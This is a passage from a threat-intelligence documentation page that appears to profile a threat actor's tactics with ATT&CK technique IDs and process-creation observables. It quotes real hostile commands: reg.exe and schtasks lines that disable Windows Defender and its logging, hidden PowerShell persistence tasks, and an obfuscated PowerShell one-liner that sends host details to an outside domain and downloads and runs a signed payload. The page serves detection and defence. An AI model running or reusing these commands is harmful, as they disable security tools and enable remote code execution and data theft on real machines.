anchorWithStickyNavbar_y2LR" id="tactic-1"></a>Tactic<a class="hash-link" href="#tactic-1" title="Direct link to heading">#</a></h4><ul><li>Defense Evasion</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="techniques-1"></a>Techniques<a class="hash-link" href="#techniques-1" title="Direct link to heading">#</a></h4><ul><li>T1562.001 - Impair Defenses: Disable or Modify Tools</li><li>T1112 - Modify Registry</li><li>T1059.001 - Command and Scripting Interpreter: PowerShell</li><li>T1059.003 - Command and Scripting Interpreter: Windows Command Shell</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="behaviors-and-observables-1"></a>Behaviors and Observables<a class="hash-link" href="#behaviors-and-observables-1" title="Direct link to heading">#</a></h4><table><thead><tr><th>Tech IDs</th><th>Behaviors</th><th>Observables</th></tr></thead><tbody><tr><td>T1562.001<br>T1112<br>T1059.001<br>T1059.003</td><td><em>PowerShell</em> spawns multiple executions of <em>CMD</em> to run <em>Reg.exe</em>.</td><td><em>Process Created</em>: <br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg delete \&quot;HKLM\\Software\\Policies\\Microsoft\\Windows Defender\&quot; /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add \&quot;HKLM\\Software\\Policies\\Microsoft\\Windows Defender\&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add \&quot;HKLM\\Software\\Policies\\Microsoft\\Windows Defender\&quot; /v DisableAntiVirus /t REG_DWORD /d 1 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add \&quot;HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\&quot; /v MpEnablePus /t REG_DWORD /d 0 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add \&quot;HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\&quot; /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add \&quot;HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\&quot; /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add \&quot;HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\&quot; /v DisableIOAVProtection /t REG_DWORD /d 1 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add \&quot;HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\&quot; /v DisableOnAccessProtection /t REG_DWORD /d 1 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add \&quot;HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\&quot; /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add \&quot;HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\&quot; /v SpynetReporting /t REG_DWORD /d 0 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add \&quot;HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\&quot; /v SubmitSamplesConsent /t REG_DWORD /d 0 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger /v Start /t REG_DWORD /d 0 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderAuditLogger /v Start /t REG_DWORD /d 0 /f</code></td></tr></tbody></table><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="threat-actor-used-schtasks-to-disable-windows-defender-scheduled-tasks-via-powershell-for-defense-evasion"></a>Threat actor used <em>SCHTASKS</em> to disable Windows Defender Scheduled Tasks via <em>PowerShell</em> for Defense Evasion.<a class="hash-link" href="#threat-actor-used-schtasks-to-disable-windows-defender-scheduled-tasks-via-powershell-for-defense-evasion" title="Direct link to heading">#</a></h3><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="tactic-2"></a>Tactic<a class="hash-link" href="#tactic-2" title="Direct link to heading">#</a></h4><ul><li>Defense Evasion</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="techniques-2"></a>Techniques<a class="hash-link" href="#techniques-2" title="Direct link to heading">#</a></h4><ul><li>T1562.001 - Impair Defenses: Disable or Modify Tools</li><li>T1053.005 - Scheduled Task/Job: Scheduled Task</li><li>T1059.001 - Command and Scripting Interpreter: PowerShell</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="behaviors-and-observables-2"></a>Behaviors and Observables<a class="hash-link" href="#behaviors-and-observables-2" title="Direct link to heading">#</a></h4><table><thead><tr><th>Tech IDs</th><th>Behaviors</th><th>Observables</th></tr></thead><tbody><tr><td>T1562.001<br>T1053.005<br>T1059.001</td><td><em>PowerShell</em> spawns multiple executions of <em>SCHTASKS</em>.</td><td><em>Process Created</em>: <br>- <code>\&quot;C:\\Windows\\system32\\schtasks.exe\&quot; /Change /TN \&quot;Microsoft\\Windows\\ExploitGuard\\ExploitGuard MDM policy Refresh\&quot; /Disable</code><br>- <code>\&quot;C:\\Windows\\system32\\schtasks.exe\&quot; /Change /TN \&quot;Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\&quot; /Disable</code><br>- <code>\&quot;C:\\Windows\\system32\\schtasks.exe\&quot; /Change /TN \&quot;Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\&quot; /Disable</code><br>- <code>\&quot;C:\\Windows\\system32\\schtasks.exe\&quot; /Change /TN \&quot;Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\&quot; /Disable</code><br>- <code>\&quot;C:\\Windows\\system32\\schtasks.exe\&quot; /Change /TN \&quot;Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\&quot; /Disable</code></td></tr></tbody></table><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="threat-actor-used-regexe-to-disable-windows-defender-policies-and-services-via-powershell-for-defense-evasion"></a>Threat actor used <em>Reg.exe</em> to disable Windows Defender Policies and Services via <em>PowerShell</em> for Defense Evasion.<a class="hash-link" href="#threat-actor-used-regexe-to-disable-windows-defender-policies-and-services-via-powershell-for-defense-evasion" title="Direct link to heading">#</a></h3><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="tactic-3"></a>Tactic<a class="hash-link" href="#tactic-3" title="Direct link to heading">#</a></h4><ul><li>Defense Evasion</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="techniques-3"></a>Techniques<a class="hash-link" href="#techniques-3" title="Direct link to heading">#</a></h4><ul><li>T1562.001 - Impair Defenses: Disable or Modify Tools</li><li>T1112 - Modify Registry</li><li>T1059.001 - Command and Scripting Interpreter: PowerShell</li><li>T1059.003 - Command and Scripting Interpreter: Windows Command Shell</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="behaviors-and-observables-3"></a>Behaviors and Observables<a class="hash-link" href="#behaviors-and-observables-3" title="Direct link to heading">#</a></h4><table><thead><tr><th>Tech IDs</th><th>Behaviors</th><th>Observables</th></tr></thead><tbody><tr><td>T1562.001<br>T1112<br>T1059.001<br>T1059.003</td><td><em>PowerShell</em> spawns multiple executions of <em>CMD</em> to Disable Windows Defender Policies.</td><td><em>Process Created</em>: <br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg delete HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run /v \&quot;Windows Defender\&quot; /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \&quot;Windows Defender\&quot; /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg delete HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsDefender /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg delete HKCR\\*\\shellex\\ContextMenuHandlers\\EPP /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg delete HKCR\\Directory\\shellex\\ContextMenuHandlers\\EPP /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg delete HKCR\\Drive\\shellex\\ContextMenuHandlers\\EPP /f</code></td></tr><tr><td>T1562.001<br>T1112<br>T1059.001<br>T1059.003</td><td><em>PowerShell</em> spawns multiple executions of <em>CMD</em> to Disable Windows Defender Services.</td><td><em>Process Created</em>: <br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add HKLM\\System\\CurrentControlSet\\Services\\WdBoot /v Start /t REG_DWORD /d 4 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add HKLM\\System\\CurrentControlSet\\Services\\WdFilter /v Start /t REG_DWORD /d 4 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add HKLM\\System\\CurrentControlSet\\Services\\WdNisDrv /v Start /t REG_DWORD /d 4 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add HKLM\\System\\CurrentControlSet\\Services\\WdNisSvc /v Start /t REG_DWORD /d 4 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add HKLM\\System\\CurrentControlSet\\Services\\WinDefend /v Start /t REG_DWORD /d 4 /f</code><br>- <code>\&quot;C:\\Windows\\system32\\cmd.exe\&quot; /c reg add HKLM\\System\\CurrentControlSet\\Services\\SecurityHealthService /v Start /t REG_DWORD /d 4 /f</code></td></tr></tbody></table><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="threat-actor-used-schtasks-to-create-and-execute-scheduled-tasks-for-persistence"></a>Threat actor used <em>SCHTASKS</em> to create and execute scheduled tasks for Persistence.<a class="hash-link" href="#threat-actor-used-schtasks-to-create-and-execute-scheduled-tasks-for-persistence" title="Direct link to heading">#</a></h3><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="tactic-4"></a>Tactic<a class="hash-link" href="#tactic-4" title="Direct link to heading">#</a></h4><ul><li>Persistence</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="techniques-4"></a>Techniques<a class="hash-link" href="#techniques-4" title="Direct link to heading">#</a></h4><ul><li>T1059.001 - Command and Scripting Interpreter: PowerShell</li><li>T1053.005 - Scheduled Task/Job: Scheduled Task</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="behaviors-and-observables-4"></a>Behaviors and Observables<a class="hash-link" href="#behaviors-and-observables-4" title="Direct link to heading">#</a></h4><table><thead><tr><th>Tech IDs</th><th>Behaviors</th><th>Observables</th></tr></thead><tbody><tr><td>T1059.001<br>T1053.005</td><td><em>PowerShell</em> spawns multiple executions of <em>SCHTASKS</em>.</td><td><em>Process Created</em>: <br>- <code>\&quot;C:\\Windows\\system32\\schtasks.exe\&quot; /create /sc MINUTE /mo 120 /tn blackball1 /F /tr blackball1</code><br>- <code>\&quot;C:\\Windows\\system32\\schtasks.exe\&quot; /create /sc MINUTE /mo 120 /tn blackball /F /tr blackball</code><br>- <code>\&quot;C:\\Windows\\system32\\schtasks.exe\&quot; /create /sc MINUTE /mo 60 /tn \\lUWLs8e0z /F /tr \&quot;powershell -w hidden -c PS_CMD\&quot;</code><br>- <code>\&quot;C:\\Windows\\system32\\schtasks.exe\&quot; /create /sc MINUTE /mo 60 /tn a2utp8I\\g4yeU6uwoY /F /tr \&quot;powershell -w hidden -c PS_CMD\&quot;</code><br>- <code>\&quot;C:\\Windows\\system32\\schtasks.exe\&quot; /run /tn a2utp8I\\g4yeU6uwoY</code></td></tr></tbody></table><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="threat-actor-used-a-highly-obfuscated-powershell-commands-for-command-and-control"></a>Threat actor used a <em>highly obfuscated PowerShell</em> commands for Command And Control.<a class="hash-link" href="#threat-actor-used-a-highly-obfuscated-powershell-commands-for-command-and-control" title="Direct link to heading">#</a></h3><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="tactic-5"></a>Tactic<a class="hash-link" href="#tactic-5" title="Direct link to heading">#</a></h4><ul><li>Command And Control</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="techniques-5"></a>Techniques<a class="hash-link" href="#techniques-5" title="Direct link to heading">#</a></h4><ul><li>T1059.003 - Command and Scripting Interpreter: Windows Command Shell</li><li>T1027 - Obfuscated Files or Information</li><li>T1059.001 - Command and Scripting Interpreter: PowerShell</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="behaviors-and-observables-5"></a>Behaviors and Observables<a class="hash-link" href="#behaviors-and-observables-5" title="Direct link to heading">#</a></h4><table><thead><tr><th>Tech IDs</th><th>Behaviors</th><th>Observables</th></tr></thead><tbody><tr><td>T1059.003</td><td><em>CMD</em> spawns execution of <em>PowerShell</em> one-liner.</td><td><em>Process Created</em>: <br>- <code>/c powershell -w hidden -c function a($u)[REDACTED]</code></td></tr><tr><td>T1027<br>T1059.001</td><td><em>PowerShell</em> executes one-liner.</td><td><em>Process Created</em>: <br>- <code>powershell -w hidden -c function a($u){$d=(Ne</code>w-Obj<code>ect Net.WebC</code>lient).\&quot;DownloadData\&quot;($u);$c=$d.count;if($c -gt 173){$b=$d[173..$c];$p=New-Object Security.Cryptography.RSAParameters;$p.Modulus=[convert]::FromBase64String(&#x27;2mWo17uXvG1BXpmdgv8v/3NTmnNubHtV62fWrk4jPFI9wM3NN2vzTzticIYHlm7K3r2mT/YR0WDciL818pLubLgum30r0Rkwc8ZSAc3nxzR4iqef4hLNeUCnkWqulY5C0M85bjDLCpjblz/2LpUQcv1j1feIY6R7rpfqOLdHa10=&#x27;);$p.Exponent=0x01,0x00,0x01;$r=New-Object Security.Cryptography.RSACryptoServiceProvider;$r.ImportParameters($p);if($r.verifyData($b,(New-Object Security.Cryptography.SHA1CryptoServiceProvider),[convert]::FromBase64String(-join([char[]]$d[0..171])))){I<code>ex(-join[char[]]$b)}}}$url=&#x27;http://&#x27;+&#x27;t.zz3&#x27;+&#x27;r0.com&#x27;;a($url+&#x27;/aa.jsp?ipc_20210405?&#x27;+(@($env:COMPUTERNAME,$env:USERNAME,(get-wmiobject Win32_ComputerSystemProduct).UUID,(random))-join&#x27;*&#x27;))</code></td></tr></tbody></table><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="notes"></a>Notes<a class="hash-link" href="#notes" title="Direct link to heading">#</a></h4><ul><li>The command is highly obfuscated.</li></ul></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages navigation"><div class="pagination-nav__item"><a class="pagination-nav__link" href="/ac3-threat-sightings/docs/Sightings/Guildma_RAT"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Â« Guildma_RAT</div></a></div><div class="pagination-nav__item pagination-nav__item--next"><a class="pagination-nav__link" href="/ac3-threat-sightings/docs/Sightings/UNK-Credential_Access"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">UNK-Credential_Access Â»</div></a></div></nav></div></div><div class="col col--3"><div class="tableOfContents_vrFS thin-scrollbar"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#overview" class="table-of-contents__link">Overview</a><ul><li><a href="#references" class="table-of-contents__link">References:</a></li><li><a href="#threat-actor-activity" class="table-of-contents__link">Threat Actor Activity</a></li><li><a href="#count-of-documented-ttps-by-tactic" class="table-of-contents__link">Count of documented TTPs by Tactic</a></li><li><a href="#attack-flow" class="table-of-contents__link">Attack Flow</a></li></ul></li><li><a href="#tactics-techniques-and-procedures" class="table-of-contents__link">Tactics, Techniques and Procedures</a></li><li><a href="#tactics-techniques-procedures-observables-and-notes" class="table-of-contents__link">Tactics, Techniques, Procedures, Observables and Notes</a></li><li><a href="#ttp-profiles-with-observables" class="table-of-contents__link">TTP Profiles with Observables</a><ul><li><a href="#threat-actor-used-wmic-to-uninstall-software-security-solutions-via-powershell-and-cmd-for-defense-evasion" class="table-of-contents__link">Threat actor used <em>WMIC</em> to uninstall software security solutions via <em>PowerShell</em> and <em>CMD</em> for Defense Evasion.</a></li><li><a href="#threat-actor-used-regexe-to-disable-windows-defender-policies-via-powershell-and-cmd-for-defense-evasion" class="table-of-contents__link">Threat actor used <em>Reg.exe</em> to disable Windows Defender Policies via <em>PowerShell</em> and <em>CMD</em> for Defense Evasion.</a></li><li><a href="#threat-actor-used-schtasks-to-disable-windows-defender-scheduled-tasks-via-powershell-for-defense-evasion" class="table-of-contents__link">Threat actor used <em>SCHTASKS</em> to disable Windows Defender Scheduled Tasks via <em>PowerShell</em> for Defense Evasion.</a></li><li><a href="#threat-actor-used-regexe-to-disable-windows-defender-policies-and-services-via-powershell-for-defense-evasion" class="table-of-contents__link">Threat actor used <em>Reg.exe</em> to disable Windows Defender Policies and Services via <em>PowerShell</em> for Defense Evasion.</a></li><li><a href="#threat-actor-used-schtasks-to-create-and-execute-scheduled-tasks-for-persistence" class="table-of-contents__link">Threat actor used <em>SCHTASKS</em> to create and execute scheduled tasks for Persistence.</a></li><li><a href="#threat-actor-used-a-highly-obfuscated-powershell-commands-for-command-and-control" class="table-of-contents__link">Threat actor used a <em>highly obfuscated PowerShell</em> commands for Command And Control.</a></li></ul></li></ul></div></div></div></div></main></div></div></div>
<script src="/ac3-threat-sightings/assets/js/runtime~main.c07ad03c.js"></script>
<script src="/ac3-threat-sightings/assets/js/main.a21a4089.js"></script>
</body>
</html>